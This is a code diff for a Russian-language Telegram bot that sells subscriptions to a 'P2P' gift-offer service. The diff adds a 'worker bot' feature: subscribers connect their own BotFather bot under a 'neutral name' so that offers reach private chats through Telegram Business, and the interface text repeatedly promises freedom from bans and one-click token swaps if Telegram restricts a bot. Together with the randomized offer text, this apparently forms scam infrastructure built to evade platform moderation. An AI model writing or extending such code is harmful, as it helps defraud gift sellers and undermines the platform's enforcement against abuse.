@@ -47,6 +47,7 @@ from keyboards import (
     get_screen2_keyboard,
     get_screen3_buyer_keyboard,
     get_main_menu_keyboard,
+    get_worker_menu_keyboard,
     get_profile_keyboard,
     get_sub_menu_keyboard,
     get_back_to_menu_keyboard,
@@ -85,15 +86,18 @@ def get_buyer_display(deal: dict) -> str:
 
 def get_welcome_text() -> str:
     return (
-        "👋 <b>Добро пожаловать в сервис безопасных сделок NFT!</b>\n\n"
-        "Платформа для покупки и передачи уникальных Telegram-подарков с гарантией доставки и защитой от мошенников.\n\n"
-        "🚀 <b>Главные функции:</b>\n"
-        "• <b>Офферы через Telegram Business</b> — отправка карточек прямо в личный диалог с продавцом\n"
-        "• <b>Инлайн-офферы (PRO)</b> — отправка предложений в любых чатах через <code>@bot ссылка цена</code>\n"
-        "• <b>Гарант-сопровождение</b> — автоматическая верификация поступления NFT перед начислением оплаты\n"
-        "• <b>Прямые расчёты</b> — поддержка безопасных платежей в Telegram Stars и TON (GRAM)\n\n"
-        "👇 <i>Выберите нужный раздел в меню ниже:</i>"
+        "👋 <b>Добро пожаловать в P2P платформу управления сделками!</b>\n\n"
+        "Надёжный сервис для автоматизации безопасных офферов на подарки в Telegram.\n\n"
+        "🚀 <b>Возможности сервиса:</b>\n"
+        "• <b>Личный рабочий бот</b> — работа через вашего собственного бота без риска бана\n"
+        "• <b>Telegram Business</b> — прямая отправка карточек офферов в личные диалоги\n"
+        "• <b>P2P Эскроу</b> — безопасная передача предметов\n"
+        "• <b>Мгновенные выплаты</b> — Telegram Stars и TON\n\n"
+        "👇 <i>Для начала работы подключите вашего рабочего бота в меню ниже:</i>"
     )
+
+class MasterStates(StatesGroup):
+    waiting_worker_token = State()
 
 class CreateOfferStates(StatesGroup):
     waiting_gift_url = State()
@@ -399,6 +403,137 @@ async def handle_menu_create(callback: CallbackQuery, state: FSMContext):
         parse_mode="HTML"
     )
     await safe_answer(callback)
+
+# --- WORKER BOT MANAGEMENT (MASTER BOT) ---
+
+@router.callback_query(F.data == "menu_worker_bot")
+async def handle_menu_worker_bot(callback: CallbackQuery):
+    user_id = callback.from_user.id
+    is_active = await db.is_subscription_active(user_id)
+    if not is_active:
+        text = (
+            "🤖 <b>Личный рабочий бот</b>\n\n"
+            "Для подключения личного рабочего бота требуется активная подписка.\n\n"
+            "После оформления подписки вы сможете привязать своего собственного бота от @BotFather "
+            "и безопасно создавать офферы без риска блокировки основного сервиса."
+        )
+        try:
+            await callback.message.edit_text(text, reply_markup=get_buy_sub_keyboard(), parse_mode="HTML")
+        except Exception:
+            await callback.message.answer(text, reply_markup=get_buy_sub_keyboard(), parse_mode="HTML")
+        await safe_answer(callback)
+        return
+
+    worker = await db.get_worker_bot(user_id)
+    if worker:
+        bot_uname = worker.get("bot_username", "bot")
+        text = (
+            f"🤖 <b>Ваш рабочий бот:</b> @{bot_uname} (🟢 <b>Активен</b>)\n\n"
+            f"• <b>Статус:</b> Запущен на сервере и готов к работе\n"
+            f"• <b>Telegram Business:</b> Добавьте @{bot_uname} в <i>Настройки ➔ Telegram Business ➔ Чат-боты</i> на вашем аккаунте\n"
+            f"• <b>Создание офферов:</b> Откройте бота и отправьте /create\n\n"
+            f"<i>Если Telegram когда-либо ограничит этого бота, вы можете в 1 клик сменить токен ниже без потери подписки и данных.</i>"
+        )
+        try:
+            await callback.message.edit_text(text, reply_markup=get_worker_menu_keyboard(bot_uname), parse_mode="HTML")
+        except Exception:
+            await callback.message.answer(text, reply_markup=get_worker_menu_keyboard(bot_uname), parse_mode="HTML")
+    else:
+        text = (
+            "🤖 <b>Подключение личного рабочего бота</b>\n\n"
+            "1. Откройте официального бота <b>@BotFather</b> в Telegram.\n"
+            "2. Отправьте команду <code>/newbot</code> и укажите нейтральное имя (например: <i>TradeSwapBot</i>).\n"
+            "3. Скопируйте полученный <b>HTTP API Token</b> и нажмите кнопку ниже для привязки.\n\n"
+            "⚡️ <i>Все ваши офферы и сделки будут работать через вашего личного бота, защищая основной сервис от блокировок.</i>"
+        )
+        try:
+            await callback.message.edit_text(text, reply_markup=get_worker_menu_keyboard(None), parse_mode="HTML")
+        except Exception:
+            await callback.message.answer(text, reply_markup=get_worker_menu_keyboard(None), parse_mode="HTML")
+    await safe_answer(callback)
+
+@router.callback_query(F.data == "worker_input_token")
+async def handle_worker_input_token(callback: CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    is_active = await db.is_subscription_active(user_id)
+    if not is_active:
+        await safe_answer(callback, "Требуется активная подписка!", show_alert=True)
+        return
+
+    await state.set_state(MasterStates.waiting_worker_token)
+    text = (
+        "🔑 <b>Привязка токена рабочего бота</b>\n\n"
+        "Отправьте сюда <b>HTTP API Token</b> вашего бота от @BotFather\n"
+        "(например: <code>1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ</code>):\n\n"
+        "<i>Для отмены отправьте /cancel</i>"
+    )
+    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 Отмена", callback_data="menu_worker_bot")]
+    ])
+    await callback.message.answer(text, reply_markup=cancel_kb, parse_mode="HTML")
+    await safe_answer(callback)
+
+@router.message(MasterStates.waiting_worker_token)
+async def process_worker_token_input(message: Message, state: FSMContext):
+    token = (message.text or "").strip()
+    if token.lower() in ("/cancel", "отмена"):
+        await state.clear()
+        await message.answer("Ввод токена отменён.", reply_markup=get_main_menu_keyboard())
+        return
+
+    if not re.match(r"^\d{8,12}:[A-Za-z0-9_-]{30,}$", token):
+        await message.answer(
+            "❌ <b>Некорректный формат токена!</b>\n\n"
+            "Формат токена: <code>1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ</code>\n"
+            "Попробуйте ещё раз или отправьте /cancel для отмены:",
+            parse_mode="HTML"
+        )
+        return
+
+    wait_msg = await message.answer("⏳ <i>Проверяю и запускаю вашего бота в Telegram...</i>", parse_mode="HTML")
+    from worker_manager import worker_manager
+    ok, res = await worker_manager.start_worker(message.from_user.id, token)
+    await state.clear()
+    try:
+        await wait_msg.delete()
+    except Exception:
+        pass
+
+    if ok:
+        success_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="👉 Открыть рабочего бота", url=f"https://t.me/{res}")],
+            [InlineKeyboardButton(text="🔙 Главное меню", callback_data="menu_main")]
+        ])
+        await message.answer(
+            f"✅ <b>Рабочий бот @{res} успешно подключён и запущен!</b>\n\n"
+            f"1. Перейдите в вашего бота @{res} и отправьте /start.\n"
+            f"2. Для создания предложений используйте /create прямо в нём.\n"
+            f"3. Для отправки в личные диалоги подключите @{res} в <i>Настройки ➔ Telegram Business ➔ Чат-боты</i>.",
+            reply_markup=success_kb,
+            parse_mode="HTML"
+        )
+    else:
+        fail_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data="worker_input_token")],
+            [InlineKeyboardButton(text="🔙 В главное меню", callback_data="menu_main")]
+        ])
+        await message.answer(
+            f"❌ <b>Не удалось запустить бота:</b>\n{res}\n\n"
+            f"Убедитесь, что токен правильный и бот не заблокирован.",
+            reply_markup=fail_kb,
+            parse_mode="HTML"
+        )
+
+@router.callback_query(F.data == "worker_disconnect")
+async def handle_worker_disconnect(callback: CallbackQuery):
+    from worker_manager import worker_manager
+    await worker_manager.stop_worker(callback.from_user.id)
+    await callback.message.edit_text(
+        "✅ <b>Рабочий бот успешно отключён.</b>\nВы можете в любой момент подключить нового бота.",
+        reply_markup=get_main_menu_keyboard(),
+        parse_mode="HTML"
+    )
+    await safe_answer(callback, "Бот отключён.")
 
 def build_randomized_offer_text(nft_name: str, nft_number: str, nft_url: str, stars_txt: str, timer_str: str, lang: str = "RU") -> Tuple[str, str]:
     """
